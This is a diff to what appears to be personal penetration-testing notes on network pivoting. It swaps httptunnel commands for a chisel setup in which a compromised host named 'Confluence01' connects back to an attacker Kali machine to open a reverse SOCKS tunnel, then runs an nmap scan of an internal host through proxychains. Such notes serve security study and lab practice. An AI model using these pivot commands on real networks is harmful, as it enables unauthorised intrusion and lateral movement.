@@ -68,9 +68,15 @@ socks5 127.0.0.1 9998(attacker machine)
 ```
 ###### httptunnel
 ```
-sudo apt install httptunnel
-hts --forward-port localhost:8888 1234(listening on)
-htc --forward-port 8080(listening on) 10.11.0.128:1234
+![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/0c4201e9-44ae-4d2f-ad93-a5ddb4317f52)
+
+Confluence01: .\chisel.exe client 192.168.45.214:8080 R:socks
+kali(attacker machine): chisel server --port 8080 --reverse/chisel server --port 8080 --socks5 --reverse
+
+proxychains4:
+add socks5 127.0.0.1 1080(chisel default port to listen)
+disable proxy dns
+sudo proxychains4 -f /etc/proxychains4.conf nmap -sS -Pn -p 80 172.16.243.10
 ```
 ### Windows Port forwarding
 ###### PLINK.exe
